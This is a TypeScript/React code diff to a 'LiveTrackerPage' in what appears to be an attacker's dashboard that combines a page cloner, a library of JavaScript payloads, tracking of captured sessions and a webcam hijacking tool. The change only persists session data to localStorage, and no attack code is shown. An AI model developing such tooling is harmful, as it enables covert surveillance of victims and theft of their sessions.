@@ -7,15 +7,23 @@ import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
 import { JavaScriptLibrary, type JsPayload } from '@/components/javascript-library';
 import { Separator } from '@/components/ui/separator';
 import { WebcamHijackTool } from '@/components/webcam-hijack-tool';
+import { useLocalStorage } from '@/hooks/use-local-storage';
 
 export default function LiveTrackerPage() {
   const [selectedPayload, setSelectedPayload] = useState<JsPayload | null>(null);
-  const [sessions, setSessions] = useState<Map<string, TrackedEvent[]>>(new Map());
+  const { value: sessions, setValue: setSessions } = useLocalStorage<Record<string, TrackedEvent[]>>('netra-sessions', {});
   const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
 
   const handleSelectPayload = (payload: JsPayload) => {
     setSelectedPayload(payload);
   }
+  
+  // Convert Record to Map for components that expect it
+  const sessionsMap = new Map(Object.entries(sessions));
+
+  const setSessionsFromMap = (newMap: Map<string, TrackedEvent[]>) => {
+    setSessions(Object.fromEntries(newMap.entries()));
+  };
 
   return (
     <div className="flex flex-col gap-6">
@@ -27,8 +35,8 @@ export default function LiveTrackerPage() {
       <AdvancedPageCloner selectedPayload={selectedPayload}/>
       <Separator className="my-4" />
       <LiveTracker 
-        sessions={sessions}
-        setSessions={setSessions}
+        sessions={sessionsMap}
+        setSessions={setSessionsFromMap}
         selectedSessionId={selectedSessionId}
         setSelectedSessionId={setSelectedSessionId}
       />
@@ -36,7 +44,7 @@ export default function LiveTrackerPage() {
       <JavaScriptLibrary onSelectPayload={handleSelectPayload}/>
       <Separator className="my-4" />
       <WebcamHijackTool 
-        sessions={sessions} 
+        sessions={sessionsMap} 
         selectedSessionId={selectedSessionId}
         setSelectedSessionId={setSelectedSessionId}
       />
